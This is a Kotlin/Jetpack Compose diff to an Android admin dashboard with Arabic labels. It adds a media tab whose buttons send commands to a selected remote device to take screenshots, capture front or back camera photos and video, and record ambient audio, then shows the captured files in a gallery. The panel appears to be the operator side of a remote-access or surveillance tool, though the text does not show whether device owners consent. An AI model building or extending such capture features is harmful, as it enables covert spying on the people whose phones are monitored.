@@ -61,9 +61,14 @@ import androidx.compose.ui.unit.Velocity
 import androidx.compose.animation.core.*
 import androidx.compose.ui.graphics.graphicsLayer
 import androidx.compose.ui.geometry.Offset
+
 import java.text.SimpleDateFormat
 import java.util.*
 import android.util.Base64
+
+import coil.compose.AsyncImage
+import coil.request.ImageRequest
+
 import androidx.compose.ui.viewinterop.AndroidView
 import androidx.media3.exoplayer.rtsp.RtspMediaSource
 import androidx.media3.common.MediaItem as Media3MediaItem
@@ -1070,7 +1075,8 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                         ) {
                             listOf(
                                 Triple(0, Icons.Default.Home, "الرئيسية"),
-                                Triple(1, Icons.Default.GridView, "الأوامر")
+                                Triple(1, Icons.Default.GridView, "الأوامر"),
+                                Triple(2, Icons.Default.PhotoLibrary, "الوسائط")
                             ).forEach { (index, icon, label) ->
                                 val isSelected = bottomNavSelectedTab == index
                                 val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
@@ -1203,10 +1209,10 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                 Box(
                     modifier = Modifier.weight(1f).fillMaxWidth()
                 ) {
-                    if (bottomNavSelectedTab == 0) {
-                        DeviceHomeTab(activeDevice, viewModel)
-                    } else {
-                        DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
+                    when (bottomNavSelectedTab) {
+                        0 -> DeviceHomeTab(activeDevice, viewModel)
+                        1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
+                        2 -> DeviceMediaGalleryTab(viewModel)
                     }
                 }
             }
@@ -5010,4 +5016,219 @@ fun LiveStreamPlayer(
             )
         }
     }
+}
+
+@Composable
+fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
+    val screenshots by viewModel.screenshots.collectAsState()
+    val cameraPhotos by viewModel.cameraPhotos.collectAsState()
+    val cameraVideos by viewModel.cameraVideos.collectAsState()
+    val audioRecords by viewModel.audioRecords.collectAsState()
+
+    var selectedCategory by remember { mutableIntStateOf(0) } // 0: الصور, 1: الصوت, 2: الفيديو
+    val categories = listOf("الصور والشاشة" to 0, "الصوت" to 1, "الفيديو" to 2)
+
+    val allImages = (screenshots + cameraPhotos).sortedByDescending { it.timestamp }
+    val allAudio = audioRecords.sortedByDescending { it.timestamp }
+    val allVideos = cameraVideos.sortedByDescending { it.timestamp }
+
+    var expandedMedia by remember { mutableStateOf<MediaItem?>(null) }
+    val context = LocalContext.current
+
+    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
+        // Tab Row
+        Row(modifier = Modifier.fillMaxWidth().background(Color.White, RoundedCornerShape(12.dp)).padding(4.dp)) {
+            categories.forEach { (label, index) ->
+                val isSelected = selectedCategory == index
+                Box(
+                    modifier = Modifier
+                        .weight(1f)
+                        .height(40.dp)
+                        .clip(RoundedCornerShape(8.dp))
+                        .background(if (isSelected) Color(0xFF9155FF) else Color.Transparent)
+                        .clickable { selectedCategory = index },
+                    contentAlignment = Alignment.Center
+                ) {
+                    Text(label, color = if (isSelected) Color.White else Color(0xFF6B7280), fontWeight = FontWeight.Bold)
+                }
+            }
+        }
+        
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // Actions Row for WebSockets Commands relative to Current Tab
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            if (selectedCategory == 0) {
+                Button(onClick = { viewModel.requestScreenshot() }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))) {
+                    Text("لقطة شاشة", fontSize = 11.sp, maxLines = 1)
+                }
+                Button(onClick = { viewModel.requestPhoto(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF))) {
+                    Text("أمامية", color = Color.Black, fontSize = 11.sp, maxLines = 1)
+                }
+                Button(onClick = { viewModel.requestPhoto(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))) {
+                    Text("خلفية", fontSize = 11.sp, maxLines = 1)
+                }
+            } else if (selectedCategory == 1) {
+                Button(onClick = { viewModel.requestAudioRecord() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9100))) {
+                    Text("تسجيل وحفظ مقطع صوتي", fontSize = 12.sp)
+                }
+            } else {
+                Button(onClick = { viewModel.requestVideo(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))) {
+                    Text("فيديو أمامي", fontSize = 11.sp)
+                }
+                Button(onClick = { viewModel.requestVideo(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F))) {
+                    Text("فيديو خلفي", fontSize = 11.sp)
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // Content Display
+        Box(modifier = Modifier.weight(1f)) {
+            when (selectedCategory) {
+                0 -> {
+                    if (allImages.isEmpty()) EmptyMediaNotice("لا توجد صور متوفرة")
+                    else LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                        items(allImages) { item -> GalleryImageCard(item) { expandedMedia = it } }
+                    }
+                }
+                1 -> {
+                    if (allAudio.isEmpty()) EmptyMediaNotice("لا توجد تسجيلات صوتية مجدولة")
+                    else LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                        items(allAudio) { item -> AudioListCard(item) { expandedMedia = it } }
+                    }
+                }
+                2 -> {
+                    if (allVideos.isEmpty()) EmptyMediaNotice("لا توجد مقتطفات فيديو متوفرة")
+                    else LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                        items(allVideos) { item -> GalleryVideoCard(item) { expandedMedia = it } }
+                    }
+                }
+            }
+        }
+    }
+
+    // Modal for Expanded View & Playback
+    if (expandedMedia != null) {
+        Dialog(onDismissRequest = { expandedMedia = null }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
+            Box(modifier = Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.9f)).padding(16.dp), contentAlignment = Alignment.Center) {
+                when (expandedMedia!!.type) {
+                    "screenshot", "camera_photo" -> {
+                        if (expandedMedia!!.url.isNotEmpty()) {
+                            AsyncImage(
+                                model = ImageRequest.Builder(context).data(expandedMedia!!.url).crossfade(true).build(),
+                                contentDescription = null,
+                                modifier = Modifier.fillMaxSize(),
+                                contentScale = ContentScale.Fit
+                            )
+                        } else {
+                            val bmp = expandedMedia!!.toBitmap()
+                            if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
+                            else Text("خطأ في فك تشفير الصورة", color = Color.White)
+                        }
+                    }
+                    else -> {
+                        ExoPlayerVideoView(mediaItem = expandedMedia!!)
+                    }
+                }
+                
+                IconButton(onClick = { expandedMedia = null }, modifier = Modifier.align(Alignment.TopStart).padding(top = 24.dp)) {
+                    Icon(Icons.Default.Close, null, tint = Color.White)
+                }
+            }
+        }
+    }
+}
+
+@Composable
+fun EmptyMediaNotice(message: String) {
+    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Column(horizontalAlignment = Alignment.CenterHorizontally) {
+            Icon(Icons.Default.CloudOff, contentDescription = null, tint = Color(0xFFD1D5DB), modifier = Modifier.size(64.dp))
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(message, color = Color(0xFF9CA3AF), fontSize = 14.sp)
+        }
+    }
+}
+
+@Composable
+fun GalleryImageCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
+    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
+    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().aspectRatio(1f).clickable { onClick(item) }) {
+        Box(modifier = Modifier.fillMaxSize()) {
+            if (item.url.isNotEmpty()) {
+                AsyncImage(model = item.url, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
+            } else {
+                val bmp = item.toBitmap()
+                if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
+                else Box(modifier = Modifier.fillMaxSize().background(Color.Gray))
+            }
+            Box(modifier = Modifier.align(Alignment.BottomStart).fillMaxWidth().background(Brush.verticalGradient(listOf(Color.Transparent, Color.Black))).padding(6.dp)) {
+                Text(formatter.format(Date(item.timestamp)), color = Color.White, fontSize = 9.sp)
+            }
+        }
+    }
+}
+
+@Composable
+fun GalleryVideoCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
+    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
+    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().aspectRatio(1f).clickable { onClick(item) }) {
+        Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
+            Icon(Icons.Default.PlayCircleOutline, contentDescription = "تشغيل", tint = Color.White, modifier = Modifier.align(Alignment.Center).size(36.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape))
+            Box(modifier = Modifier.align(Alignment.BottomStart).fillMaxWidth().background(Brush.verticalGradient(listOf(Color.Transparent, Color.Black))).padding(6.dp)) {
+                Text(formatter.format(Date(item.timestamp)), color = Color.White, fontSize = 9.sp)
+            }
+        }
+    }
+}
+
+@Composable
+fun AudioListCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
+    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
+    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().clickable { onClick(item) }, colors = CardDefaults.cardColors(containerColor = Color.White)) {
+        Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
+            Box(modifier = Modifier.size(40.dp).clip(CircleShape).background(Color(0xFFFF9100).copy(alpha = 0.1f)), contentAlignment = Alignment.Center) {
+                Icon(Icons.Default.PlayArrow, contentDescription = null, tint = Color(0xFFFF9100))
+            }
+            Spacer(modifier = Modifier.width(12.dp))
+            Column {
+                Text(if (item.type == "audio_record") "مقطع محيطي مسجل" else "تسجيل صوتي", color = Color(0xFF111827), fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
+                Text(formatter.format(Date(item.timestamp)), color = Color(0xFF6B7280), fontSize = 11.sp)
+            }
+        }
+    }
+}
+
+@Composable
+fun ExoPlayerVideoView(mediaItem: MediaItem) {
+    val context = LocalContext.current
+    var exoPlayer by remember { mutableStateOf<ExoPlayer?>(null) }
+    if (mediaItem.url.isEmpty()) {
+        Text("خطأ: رابط الملف غير متوفر أو فارغ. (Base64 Video Not Supported Here)", color = Color.White, modifier = Modifier.padding(16.dp))
+        return
+    }
+    DisposableEffect(Unit) {
+        val player = ExoPlayer.Builder(context).build().apply {
+            setMediaItem(androidx.media3.common.MediaItem.fromUri(mediaItem.url))
+            prepare()
+            playWhenReady = true
+        }
+        exoPlayer = player
+        onDispose { player.release() }
+    }
+    AndroidView(
+        factory = { ctx ->
+            PlayerView(ctx).apply {
+                this.player = exoPlayer
+                useController = true
+                layoutParams = android.view.ViewGroup.LayoutParams(
+                    android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                    android.view.ViewGroup.LayoutParams.MATCH_PARENT
+                )
+            }
+        },
+        modifier = Modifier.fillMaxSize()
+    )
 }
